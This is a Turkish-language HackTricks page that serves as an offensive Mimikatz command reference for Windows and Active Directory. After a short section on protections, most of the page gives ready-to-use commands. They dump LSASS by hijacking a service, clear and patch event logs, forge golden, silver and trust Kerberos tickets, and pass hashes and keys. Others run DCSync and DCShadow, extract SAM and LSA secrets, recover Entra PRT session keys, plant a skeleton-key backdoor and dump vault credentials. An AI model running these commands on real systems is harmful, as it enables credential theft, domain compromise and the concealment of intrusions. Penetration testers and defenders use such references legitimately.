# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Bu sayfa [adsecurity.org](https://adsecurity.org/?page_id=1821) sitesindeki bir sayfayı temel alır**. Daha fazla bilgi için orijinalini inceleyin!<sup>[[3]](#references)</sup>

## Bellekte LM ve düz metin

Windows 8.1 ve Windows Server 2012 R2 sürümlerinden itibaren, kimlik bilgisi hırsızlığına karşı koruma sağlamak için önemli önlemler uygulanmıştır:

- **LM hash’leri ve düz metin parolalar**, güvenliği artırmak amacıyla artık bellekte saklanmaz. LSASS’ta "düz metin" parolaların önbelleğe alınmasını önlemek için Digest Authentication’ı devre dışı bırakan özel bir kayıt defteri ayarı olan _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ DWORD değeri `0` olarak yapılandırılmalıdır.

- **LSA Protection**, Local Security Authority (LSA) sürecini yetkisiz bellek okumaya ve kod enjeksiyonuna karşı korumak için kullanıma sunulmuştur. Bu, LSASS’ın korumalı bir süreç olarak işaretlenmesiyle sağlanır. LSA Protection’ı etkinleştirmek için:
  1. _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ konumundaki kayıt defterinde `RunAsPPL` değerini `dword:00000001` olarak ayarlayın.
  2. Bu kayıt defteri değişikliğini yönetilen cihazlarda zorunlu kılan bir Group Policy Object (GPO) uygulayın.

Bu korumalara rağmen Mimikatz gibi araçlar, belirli driver’ları kullanarak LSA Protection’ı aşabilir; ancak bu tür işlemler büyük olasılıkla olay günlüklerine kaydedilir.

Modern iş istasyonlarında bu konu daha da önemlidir; çünkü **Credential Guard, Windows 11 22H2+ ve Windows Server 2025 çalıştıran, etki alanına katılmış ve DC olmayan birçok sistemde varsayılan olarak etkindir**. Ayrıca **LSASS-as-PPL, yeni Windows 11 22H2+ kurulumlarında varsayılan olarak etkindir**. Uygulamada bu, `sekurlsa::logonpasswords` komutunun çoğu zaman eski tradecraft’ın beklediğinden daha az veri sağlaması ve operatörlerin giderek daha fazla **çevrimdışı minidump’lara**, **Kerberos key extraction’a (`sekurlsa::ekeys`)** veya **CloudAP/PRT odaklı modüllere** yönelmesi anlamına gelir. Koruma tarafı için [Windows credentials protections](credentials-protections.md) sayfasına bakın.

### SeDebugPrivilege Kaldırılmasına Karşı Önlem Alma

Yöneticiler genellikle programlarda hata ayıklamalarını sağlayan SeDebugPrivilege ayrıcalığına sahiptir. Bellek dökümlerinin yetkisiz şekilde alınmasını önlemek için bu ayrıcalık kısıtlanabilir. Bellek dökümleri, saldırganların bellekten kimlik bilgilerini çıkarmak için kullandığı yaygın bir tekniktir. Ancak bu ayrıcalık kaldırılsa bile TrustedInstaller hesabı, özelleştirilmiş bir hizmet yapılandırması kullanarak bellek dökümü alabilir:

```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```

Bu, `lsass.exe` belleğinin bir dosyaya dökülmesini sağlar; ardından kimlik bilgilerini çıkarmak için başka bir sistemde analiz edilebilir:

```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```

## Mimikatz Seçenekleri

Mimikatz'te olay günlüklerini kurcalamak iki temel işlemi içerir: olay günlüklerini temizlemek ve yeni olayların günlüğe kaydedilmesini önlemek için Event hizmetine yama uygulamak. Bu işlemleri gerçekleştirmek için kullanılan komutlar aşağıdadır:

#### Olay Günlüklerini Temizleme

Mimikatz, `event::clear` komutunu sunar. Bu komut, seçilen klasik günlük için Windows olay günlüğü temizleme API'sini çağırır. Varsayılan günlük `Security`'dir; `/log:` başka bir günlük seçer ve çağıranın günlüğü temizleme yetkisi olmalıdır. Bu, yeni kayıtların yazılmasını durdurmaya çalışan `event::drop` komutuyla aynı değildir.<sup>[[4]](#references)</sup>

```bash
mimikatz "event::clear /log:Security" exit
```

#### Deneysel Özellik: Event Service'i Patch'leme

- **Komut**: `event::drop`
- Bu deneysel komut, Event Logging Service'in davranışını değiştirmek ve böylece yeni olayları kaydetmesini etkili biçimde engellemek için tasarlanmıştır.
- Örnek: `mimikatz "privilege::debug" "event::drop" exit`

- `privilege::debug` komutu, Mimikatz'in sistem hizmetlerini değiştirmek için gerekli ayrıcalıklarla çalışmasını sağlar.
- Ardından `event::drop` komutu, Event Logging service'i patch'ler.

### Kerberos Ticket Saldırıları

Aşağıdaki komutları hızlı bir sözdizimi hatırlatıcısı olarak kullanın. [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md) ve [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) için ayrılmış sayfalarda güncel AES/PAC/opsec ayrıntıları yer alır.

### Golden Ticket Oluşturma

Golden Ticket, etki alanı genelinde erişim taklidi yapılmasına olanak tanır. Önemli komut ve parametreler:

- Komut: `kerberos::golden`
- Parametreler:
  - `/domain`: Etki alanı adı.
  - `/sid`: Etki alanının Security Identifier (SID) değeri.
  - `/user`: Taklit edilecek kullanıcı adı.
  - `/krbtgt`: Etki alanının KDC hizmet hesabının NTLM hash'i.
  - `/ptt`: Ticket'ı doğrudan belleğe enjekte eder.
  - `/ticket`: Ticket'ı daha sonra kullanmak üzere kaydeder.

Örnek:

```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```

### Silver Ticket Oluşturma

Silver Ticket'lar belirli hizmetlere erişim sağlar. Önemli komut ve parametreler:

- Komut: Golden Ticket'a benzer, ancak belirli hizmetleri hedefler.
- Parametreler:
  - `/service`: Hedeflenecek hizmet (ör. cifs, http).
  - Diğer parametreler Golden Ticket ile benzerdir.

Örnek:

```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```

### Trust Ticket Oluşturma

Trust Ticket'lar, trust ilişkilerinden yararlanarak etki alanları arasındaki kaynaklara erişmek için kullanılır. Temel komut ve parametreler:

- Komut: Golden Ticket'a benzer, ancak trust ilişkileri için kullanılır.
- Parametreler:
  - `/target`: Hedef etki alanının FQDN'si.
  - `/rc4`: Trust hesabının NTLM hash'i.

Örnek:

```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```

### Ek Kerberos Komutları

- **Ticket'ları Listeleme**:

  - Komut: `kerberos::list`
  - Geçerli kullanıcı oturumundaki tüm Kerberos ticket'larını listeler.

- **Pass the Cache**: `kerberos::ptc`, bir MIT/Heimdal `.ccache` dosyasını okur; `.kirbi` dosyasını **okumaz**. Dosya yolunu konumsal argüman olarak verin: `mimikatz "kerberos::ptc C:\Temp\user.ccache" exit`.<sup>[[5]](#references)</sup>

- **Pass the Ticket**: `kerberos::ptt`, bir `.kirbi` dosyasını veya bu tür dosyaların bulunduğu bir dizini okur. Ayrıca `/ticket:` yerine konumsal bir yol alır: `mimikatz "kerberos::ptt C:\Temp\ticket.kirbi" exit`. Daha kapsamlı iş akışı için [Pass the Ticket](../active-directory-methodology/pass-the-ticket.md) sayfasına bakın.<sup>[[6]](#references)</sup>

- **Ticket'ları Temizleme**:
  - Komut: `kerberos::purge`
  - Oturumdaki tüm Kerberos ticket'larını temizler.
  - Çakışmaları önlemek için ticket manipülasyonu komutlarını kullanmadan önce faydalıdır.

### Over-Pass-the-Hash / Pass-the-Key

`RC4` devre dışıysa veya güvenilir değilse, Mimikatz yalnızca NT hash kullanmak yerine **AES128/AES256 Kerberos key'lerini** geçerli logon session'a patch'leyebilir. Bu, `sekurlsa::pth` komutunu yalnızca NTLM içinmiş gibi ele almaktan ziyade modern domain'lere genellikle daha uygundur.<sup>[[1]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```

`/impersonate`, yeni bir konsol başlatmak yerine mevcut işlemi yeniden kullanır; bu, aynı bağlamda `lsadump::dcsync` gibi komutları hemen çalıştırmak istediğinizde kullanışlıdır.

### Active Directory'de Değişiklik Yapma

- **DCShadow**: AD nesnelerini değiştirmek için bir makinenin geçici olarak DC gibi davranmasını sağlar. Bkz. [DCShadow](../active-directory-methodology/dcshadow.md).

  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Parola verilerini istemek için bir DC'yi taklit eder. Bkz. [DCSync](../active-directory-methodology/dcsync.md).
  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Kimlik Bilgilerine Erişim

- **LSADUMP::LSA**: LSA'dan kimlik bilgilerini çıkarır.

  - `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Bir bilgisayar hesabının parola verilerini kullanarak bir DC'yi taklit eder.

  - _Orijinal bağlamda NetSync için özel bir komut verilmemiştir._

- **LSADUMP::SAM**: Yerel SAM veritabanına erişir.

  - `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Kayıt defterinde saklanan sırların şifresini çözer.

  - `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Bir kullanıcı için yeni bir NTLM hash'i ayarlar.

  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Güven ilişkisi kimlik doğrulama bilgilerini alır.
  - `mimikatz "lsadump::trust" exit`

### Cloud kimlik bilgileri / Entra ID

**Entra ID** veya **hybrid-joined** ana makinelerde `sekurlsa::cloudap`, LSASS'tan önbelleğe alınmış **Primary Refresh Token (PRT)** materyalini açığa çıkarabilir. `ProofOfPossesionKey.KeyValue`, DPAPI ile korunan oturum anahtarı blob'udur; şifresi önceden çözülmüş anahtar değildir.<sup>[[7]](#references)[[8]](#references)</sup> `/unprotect` kullanmak için `SYSTEM` olarak `dpapi::cloudapkd` çalıştırın (örneğin, yükseltilmiş bir Mimikatz oturumundan `token::elevate` kullanarak) veya önce `sekurlsa::dpapi` ile Mimikatz'in anahtar önbelleğini doldurun. Tek başına `privilege::debug`, DPAPI çağrısı yapanın bağlamını değiştirmez.<sup>[[8]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" "token::elevate" "dpapi::cloudapkd /keyvalue:<KEYVALUE> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```

İlk komuttaki **eşleşen** `Context` ve `Derived Key` değerlerini ikinci komuta kopyalayın; bağlam belirtilmediğinde Mimikatz yeni bir bağlam oluşturur. TPM korumalı bir anahtar için bile Mimikatz, özgün cihazda TPM'yi kullanarak bir imzalama anahtarı türetebilir. Düz metin anahtarın dışa aktarılması gerekmez, ancak başarılı bir türetilmiş anahtar sonucu bir tarayıcı çerezini imzalayabilir.<sup>[[7]](#references)</sup>

Microsoft Entra, ilişkili oturum anahtarının sahiplik kanıtını gerektirdiğinden yalnızca bir PRT dizgesi yeterli değildir.<sup>[[9]](#references)</sup> Diğer ana anahtar seçenekleri için [DPAPI key recovery](../windows-local-privilege-escalation/dpapi-extracting-passwords.md) bölümüne, bulut tarafındaki zincir için [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html) bölümüne bakın.

### Çeşitli

- **MISC::Skeleton**: Bir DC'deki LSASS'e backdoor enjekte edin.
  - `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: Yedekleme hakları edinin.

  - `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Debug ayrıcalıkları edinin.
  - `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: Oturum açmış kullanıcıların kimlik bilgilerini gösterin.

  - `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Bellekten Kerberos biletlerini çıkarın.
  - `mimikatz "sekurlsa::tickets /export" exit`

### SID ve Token Manipülasyonu

- **SID::add/modify**: SID ve SIDHistory değerlerini değiştirin.

  - Ekle: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
  - Değiştir: _Özgün bağlamda değiştirme için belirli bir komut yok._

- **TOKEN::Elevate**: Token'ları taklit edin.
  - `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Birden fazla RDP oturumuna izin verin.

  - `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: TS/RDP oturumlarını listeleyin.
  - _Özgün bağlamda TS::Sessions için belirli bir komut verilmemiş._

### Vault

- Windows Vault'tan parolaları çıkarın.
  - `mimikatz "vault::cred /patch" exit`




## References

- [1] [The Hacker Tools – Mimikatz modülleri](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB ve Entra ID: Yeni önbellek akışınızla tanışın](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Mimikatz komut başvurusu](https://adsecurity.org/?page_id=1821)
- [4] [Mimikatz event modülü kaynak kodu](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_event.c)
- [5] [Mimikatz ccache modülü kaynak kodu](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos_ccache.c)
- [6] [Mimikatz Kerberos modülü kaynak kodu](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos.c)
- [7] [Mimikatz CloudAP DPAPI uygulaması](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_cloudap.c)
- [8] [Primary Refresh Token'ı daha derinlemesine incelemek](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)
- [9] [Microsoft Entra Primary Refresh Token koruması](https://learn.microsoft.com/en-us/entra/identity/devices/concept-primary-refresh-token)
{{#include ../../banners/hacktricks-training.md}}
